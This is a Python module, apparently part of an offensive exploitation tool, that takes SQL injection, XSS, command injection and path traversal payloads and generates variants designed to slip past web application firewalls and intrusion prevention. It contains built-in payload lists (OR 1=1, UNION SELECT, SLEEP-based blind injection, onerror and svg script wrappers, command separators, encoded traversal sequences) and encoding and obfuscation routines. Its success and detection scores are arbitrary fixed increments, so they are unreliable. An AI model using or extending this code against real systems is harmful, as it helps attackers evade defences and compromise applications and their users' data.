import asyncio
import json
import base64
import hashlib
import random
import string
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from core.logger import log
from core.exploit_generator import ExploitType
import re


class OptimizationStrategy(Enum):
    EVASION = "evasion"
    EFFECTIVENESS = "effectiveness"
    STEALTH = "stealth"
    SPEED = "speed"


@dataclass
class PayloadVariant:
    original_payload: str
    optimized_payload: str
    optimization_type: str
    success_probability: float
    detection_risk: float
    description: str


@dataclass
class OptimizationResult:
    payload: str
    variants: List[PayloadVariant]
    best_variant: PayloadVariant
    optimization_score: float
    recommendations: List[str]


class PayloadOptimizer:
    def __init__(self, context_manager=None):
        self.context_manager = context_manager
        self.evasion_techniques = {}
        self.encoding_methods = {}
        self.obfuscation_patterns = {}

    async def initialize(self):
        """Initialize payload optimizer"""
        await self._load_evasion_techniques()
        await self._load_encoding_methods()
        await self._load_obfuscation_patterns()

    async def _load_evasion_techniques(self):
        """Load evasion techniques for different attack types"""
        self.evasion_techniques = {
            ExploitType.SQL_INJECTION: {
                "comment_variations": [
                    "--", "/*", "*/", "#", "-- ", "/* ", " */"
                ],
                "quote_escaping": [
                    "'", "\"", "\\'", "\\\"", "''", "\"\""
                ],
                "space_alternatives": [
                    " ", "/**/", "+", "%20", "%09", "%0A", "%0D"
                ],
                "case_variations": [
                    "SELECT", "select", "Select", "SeLeCt"
                ]
            },
            ExploitType.XSS: {
                "event_handlers": [
                    "onload", "onerror", "onclick", "onmouseover", "onfocus"
                ],
                "encoding_variations": [
                    "javascript:", "JAVASCRIPT:", "JavaScript:",
                    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:",
                    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:"
                ],
                "tag_variations": [
                    "<script>", "<SCRIPT>", "<Script>",
                    "<img>", "<IMG>", "<Img>",
                    "<svg>", "<SVG>", "<Svg>"
                ]
            },
            ExploitType.COMMAND_INJECTION: {
                "command_separators": [
                    ";", "|", "&", "&&", "||", "`", "$(", "${{"
                ],
                "encoding_variations": [
                    "id", "\\i\\d", "i\\d", "\\id"
                ],
                "path_variations": [
                    "/bin/bash", "/bin/sh", "bash", "sh"
                ]
            },
            ExploitType.PATH_TRAVERSAL: {
                "path_sequences": [
                    "../", "..\\", "..%2f", "..%5c", "..%252f", "..%255c"
                ],
                "encoding_variations": [
                    "%2e%2e%2f", "%2e%2e%5c", "..%c0%af", "..%c1%9c"
                ],
                "null_byte_variations": [
                    "%00", "\\x00", "\\0"
                ]
            }
        }

    async def _load_encoding_methods(self):
        """Load encoding methods for payload obfuscation"""
        self.encoding_methods = {
            "url_encoding": {
                "description": "URL encoding for web-based attacks",
                "encode": lambda x: ''.join(f'%{ord(c):02x}' for c in x),
                "decode": lambda x: bytes.fromhex(x.replace('%', '')).decode()
            },
            "html_encoding": {
                "description": "HTML entity encoding",
                "encode": lambda x: ''.join(f'&#{ord(c)};' for c in x),
                "decode": lambda x: ''.join(chr(int(m.group(1))) for m in re.finditer(r'&#(\d+);', x))
            },
            "base64_encoding": {
                "description": "Base64 encoding",
                "encode": lambda x: base64.b64encode(x.encode()).decode(),
                "decode": lambda x: base64.b64decode(x).decode()
            },
            "hex_encoding": {
                "description": "Hexadecimal encoding",
                "encode": lambda x: x.encode().hex(),
                "decode": lambda x: bytes.fromhex(x).decode()
            },
            "unicode_encoding": {
                "description": "Unicode encoding",
                "encode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
                "decode": lambda x: x.encode().decode('unicode_escape')
            }
        }

    async def _load_obfuscation_patterns(self):
        """Load obfuscation patterns for different languages"""
        self.obfuscation_patterns = {
            "javascript": {
                "string_concatenation": [
                    "'a' + 'l' + 'e' + 'r' + 't'",
                    "String.fromCharCode(97,108,101,114,116)",
                    "atob('YWxlcnQ=')"
                ],
                "variable_obfuscation": [
                    "var _0x1234 = 'alert';",
                    "var a = 'a', l = 'l', e = 'e', r = 'r', t = 't';"
                ],
                "function_obfuscation": [
                    "eval('ale' + 'rt')",
                    "Function('alert')()",
                    "window['alert']"
                ]
            },
            "sql": {
                "function_obfuscation": [
                    "CONCAT('S','E','L','E','C','T')",
                    "CHAR(83,69,76,69,67,84)",
                    "ASCII(83) + ASCII(69) + ASCII(76)"
                ],
                "comment_obfuscation": [
                    "SELECT/*comment*/1",
                    "SELECT--comment\n1",
                    "SELECT#comment\n1"
                ]
            }
        }

    async def optimize_payload(self, payload: str, exploit_type: ExploitType,
                               strategy: OptimizationStrategy = OptimizationStrategy.EVASION,
                               target_info: Dict[str, Any] = None) -> OptimizationResult:
        """Optimize payload based on strategy and target information"""
        try:
            variants = []

            # Generate variants based on strategy
            if strategy == OptimizationStrategy.EVASION:
                variants = await self._generate_evasion_variants(payload, exploit_type)
            elif strategy == OptimizationStrategy.EFFECTIVENESS:
                variants = await self._generate_effectiveness_variants(payload, exploit_type)
            elif strategy == OptimizationStrategy.STEALTH:
                variants = await self._generate_stealth_variants(payload, exploit_type)
            elif strategy == OptimizationStrategy.SPEED:
                variants = await self._generate_speed_variants(payload, exploit_type)

            # Score variants
            for variant in variants:
                variant.success_probability = await self._calculate_success_probability(variant, target_info)
                variant.detection_risk = await self._calculate_detection_risk(variant, target_info)

            # Select best variant
            best_variant = max(
                variants, key=lambda v: v.success_probability - v.detection_risk)

            # Calculate optimization score
            optimization_score = await self._calculate_optimization_score(best_variant, payload)

            # Generate recommendations
            recommendations = await self._generate_recommendations(best_variant, target_info)

            return OptimizationResult(
                payload=best_variant.optimized_payload,
                variants=variants,
                best_variant=best_variant,
                optimization_score=optimization_score,
                recommendations=recommendations
            )

        except Exception as e:
            log.error(f"Failed to optimize payload: {e}")
            return OptimizationResult(
                payload=payload,
                variants=[],
                best_variant=PayloadVariant(
                    payload, payload, "none", 0.5, 0.5, "No optimization"),
                optimization_score=0.0,
                recommendations=[]
            )

    async def _generate_evasion_variants(self, payload: str, exploit_type: ExploitType) -> List[PayloadVariant]:
        """Generate evasion variants of payload"""
        variants = []

        try:
            techniques = self.evasion_techniques.get(exploit_type, {})

            # Comment variations
            if "comment_variations" in techniques:
                for comment in techniques["comment_variations"]:
                    variant_payload = payload + " " + comment
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=variant_payload,
                        optimization_type="comment_evasion",
                        success_probability=0.0,  # Will be calculated later
                        detection_risk=0.0,  # Will be calculated later
                        description=f"Added comment evasion: {comment}"
                    ))

            # Space alternatives
            if "space_alternatives" in techniques:
                for space_alt in techniques["space_alternatives"]:
                    variant_payload = payload.replace(" ", space_alt)
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=variant_payload,
                        optimization_type="space_evasion",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description=f"Replaced spaces with: {space_alt}"
                    ))

            # Case variations
            if "case_variations" in techniques:
                for case_var in techniques["case_variations"]:
                    variant_payload = payload.replace(
                        payload.upper(), case_var)
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=variant_payload,
                        optimization_type="case_evasion",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description=f"Case variation: {case_var}"
                    ))

            # Encoding variations
            for encoding_name, encoding_info in self.encoding_methods.items():
                try:
                    encoded_payload = encoding_info["encode"](payload)
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=encoded_payload,
                        optimization_type=f"encoding_{encoding_name}",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description=f"Encoded with {encoding_name}"
                    ))
                except Exception:
                    continue

            return variants

        except Exception as e:
            log.error(f"Failed to generate evasion variants: {e}")
            return []

    async def _generate_effectiveness_variants(self, payload: str, exploit_type: ExploitType) -> List[PayloadVariant]:
        """Generate effectiveness-focused variants"""
        variants = []

        try:
            # Add multiple payloads for better success rate
            if exploit_type == ExploitType.SQL_INJECTION:
                effectiveness_payloads = [
                    payload + " OR 1=1",
                    payload + " UNION SELECT 1,2,3",
                    payload + " AND 1=1",
                    payload + " OR '1'='1'"
                ]

                for eff_payload in effectiveness_payloads:
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=eff_payload,
                        optimization_type="effectiveness_enhancement",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description="Enhanced for effectiveness"
                    ))

            elif exploit_type == ExploitType.XSS:
                effectiveness_payloads = [
                    f"<script>{payload}</script>",
                    f"<img src=x onerror={payload}>",
                    f"<svg onload={payload}>",
                    f"javascript:{payload}"
                ]

                for eff_payload in effectiveness_payloads:
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=eff_payload,
                        optimization_type="effectiveness_enhancement",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description="Enhanced for effectiveness"
                    ))

            return variants

        except Exception as e:
            log.error(f"Failed to generate effectiveness variants: {e}")
            return []

    async def _generate_stealth_variants(self, payload: str, exploit_type: ExploitType) -> List[PayloadVariant]:
        """Generate stealth-focused variants"""
        variants = []

        try:
            # Time-delayed variants
            if exploit_type == ExploitType.SQL_INJECTION:
                stealth_payloads = [
                    payload + " AND SLEEP(1)",
                    payload + " AND (SELECT SLEEP(1))",
                    payload + " AND (SELECT * FROM (SELECT(SLEEP(1)))a)"
                ]

                for stealth_payload in stealth_payloads:
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=stealth_payload,
                        optimization_type="stealth_timing",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description="Time-delayed stealth variant"
                    ))

            # Obfuscated variants
            if exploit_type == ExploitType.XSS:
                obfuscated_payloads = [
                    self._obfuscate_javascript(payload),
                    self._encode_payload(payload, "base64"),
                    self._encode_payload(payload, "hex")
                ]

                for obf_payload in obfuscated_payloads:
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=obf_payload,
                        optimization_type="stealth_obfuscation",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description="Obfuscated stealth variant"
                    ))

            return variants

        except Exception as e:
            log.error(f"Failed to generate stealth variants: {e}")
            return []

    async def _generate_speed_variants(self, payload: str, exploit_type: ExploitType) -> List[PayloadVariant]:
        """Generate speed-optimized variants"""
        variants = []

        try:
            # Simplified payloads for faster execution
            if exploit_type == ExploitType.SQL_INJECTION:
                speed_payloads = [
                    payload + " OR 1=1",
                    payload + " AND 1=1",
                    payload + " OR '1'='1'"
                ]

                for speed_payload in speed_payloads:
                    variants.append(PayloadVariant(
                        original_payload=payload,
                        optimized_payload=speed_payload,
                        optimization_type="speed_optimization",
                        success_probability=0.0,
                        detection_risk=0.0,
                        description="Speed-optimized variant"
                    ))

            return variants

        except Exception as e:
            log.error(f"Failed to generate speed variants: {e}")
            return []

    def _obfuscate_javascript(self, payload: str) -> str:
        """Obfuscate JavaScript payload"""
        try:
            # Simple string concatenation obfuscation
            obfuscated = ""
            for char in payload:
                if char.isalpha():
                    obfuscated += f"String.fromCharCode({ord(char)}) + "
                else:
                    obfuscated += f"'{char}' + "

            return obfuscated.rstrip(" + ")
        except Exception:
            return payload

    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload using specified encoding"""
        try:
            if encoding == "base64":
                return base64.b64encode(payload.encode()).decode()
            elif encoding == "hex":
                return payload.encode().hex()
            elif encoding == "url":
                import urllib.parse
                return urllib.parse.quote(payload)
            else:
                return payload
        except Exception:
            return payload

    async def _calculate_success_probability(self, variant: PayloadVariant, target_info: Dict[str, Any]) -> float:
        """Calculate success probability for variant"""
        try:
            base_probability = 0.5

            # Adjust based on optimization type
            if variant.optimization_type == "effectiveness_enhancement":
                base_probability += 0.2
            elif variant.optimization_type == "stealth_timing":
                base_probability += 0.1
            elif variant.optimization_type == "stealth_obfuscation":
                base_probability += 0.15

            # Adjust based on target characteristics
            if target_info:
                if target_info.get("has_waf", False):
                    base_probability -= 0.1
                if target_info.get("has_ips", False):
                    base_probability -= 0.05
                if target_info.get("is_production", False):
                    base_probability -= 0.1

            return max(0.0, min(1.0, base_probability))

        except Exception as e:
            log.error(f"Failed to calculate success probability: {e}")
            return 0.5

    async def _calculate_detection_risk(self, variant: PayloadVariant, target_info: Dict[str, Any]) -> float:
        """Calculate detection risk for variant"""
        try:
            base_risk = 0.5

            # Adjust based on optimization type
            if variant.optimization_type == "stealth_timing":
                base_risk -= 0.2
            elif variant.optimization_type == "stealth_obfuscation":
                base_risk -= 0.3
            elif variant.optimization_type == "effectiveness_enhancement":
                base_risk += 0.1

            # Adjust based on target characteristics
            if target_info:
                if target_info.get("has_waf", False):
                    base_risk += 0.2
                if target_info.get("has_ips", False):
                    base_risk += 0.1
                if target_info.get("is_production", False):
                    base_risk += 0.15

            return max(0.0, min(1.0, base_risk))

        except Exception as e:
            log.error(f"Failed to calculate detection risk: {e}")
            return 0.5

    async def _calculate_optimization_score(self, best_variant: PayloadVariant, original_payload: str) -> float:
        """Calculate overall optimization score"""
        try:
            # Base score from success probability and detection risk
            base_score = best_variant.success_probability - best_variant.detection_risk

            # Bonus for significant changes
            if best_variant.optimized_payload != original_payload:
                base_score += 0.1

            # Bonus for multiple optimization techniques
            if "stealth" in best_variant.optimization_type:
                base_score += 0.05

            return max(0.0, min(1.0, base_score))

        except Exception as e:
            log.error(f"Failed to calculate optimization score: {e}")
            return 0.0

    async def _generate_recommendations(self, best_variant: PayloadVariant, target_info: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on optimization results"""
        try:
            recommendations = []

            if best_variant.success_probability > 0.8:
                recommendations.append(
                    "High success probability - payload is well optimized")
            elif best_variant.success_probability < 0.3:
                recommendations.append(
                    "Low success probability - consider alternative approaches")

            if best_variant.detection_risk > 0.7:
                recommendations.append(
                    "High detection risk - implement additional evasion techniques")
            elif best_variant.detection_risk < 0.3:
                recommendations.append(
                    "Low detection risk - payload should be stealthy")

            if "stealth" in best_variant.optimization_type:
                recommendations.append(
                    "Stealth techniques applied - good for avoiding detection")

            if "effectiveness" in best_variant.optimization_type:
                recommendations.append(
                    "Effectiveness techniques applied - good for success rate")

            return recommendations

        except Exception as e:
            log.error(f"Failed to generate recommendations: {e}")
            return []

    async def batch_optimize(self, payloads: List[str], exploit_type: ExploitType,
                             strategy: OptimizationStrategy = OptimizationStrategy.EVASION) -> List[OptimizationResult]:
        """Optimize multiple payloads in batch"""
        try:
            results = []

            for payload in payloads:
                result = await self.optimize_payload(payload, exploit_type, strategy)
                results.append(result)

            return results

        except Exception as e:
            log.error(f"Failed to batch optimize payloads: {e}")
            return []

    async def compare_optimization_strategies(self, payload: str, exploit_type: ExploitType,
                                              target_info: Dict[str, Any] = None) -> Dict[str, OptimizationResult]:
        """Compare different optimization strategies for a payload"""
        try:
            results = {}

            for strategy in OptimizationStrategy:
                result = await self.optimize_payload(payload, exploit_type, strategy, target_info)
                results[strategy.value] = result

            return results

        except Exception as e:
            log.error(f"Failed to compare optimization strategies: {e}")
            return {}
